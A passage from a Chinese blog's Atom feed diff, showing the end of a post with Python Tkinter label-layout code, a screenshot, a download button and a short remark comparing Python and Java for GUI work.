font&#x3D;”14”).pack(anchor&#x3D;W, padx&#x3D;45)<br>text0 &#x3D; Label(tk, text&#x3D;str0, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>text1 &#x3D; Label(tk, text&#x3D;str1, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>text2 &#x3D; Label(tk, text&#x3D;str2, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>text3 &#x3D; Label(tk, text&#x3D;str3, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>text4 &#x3D; Label(tk, text&#x3D;str4, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>text5 &#x3D; Label(tk, text&#x3D;str5, font&#x3D;”14”, fg&#x3D;”black”, justify&#x3D;”left”).pack()<br>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    tk.mainloop()</p></div></div><div class="tag-plugin quot"><p class="content" type="text">Stellar 效果图</p></div><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20210625130323.png" alt="效果"><br>[button color&#x3D;”success” icon&#x3D;”<a href="https://up.woozooo.com/favicon.ico">https://up.woozooo.com/favicon.ico</a>“ url&#x3D;”<a href="https://wwi.lanzoui.com/i2rpKqokhuh">https://wwi.lanzoui.com/i2rpKqokhuh</a>“ type&#x3D;””]下载[&#x2F;button]</p><p>[scode type&#x3D;”yellow”]总结 %}<br>Python毕竟是写脚本的开发一个小脚本小工具效率很高,但是写GUI总体来说还是Java比较占优势.</p><p>白菜:”人生苦短 我用Python”</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+    <category term="Python" scheme="https://blog.thecat.top/tags/Python/"/>
+    
+  </entry>
+  
+</feed>
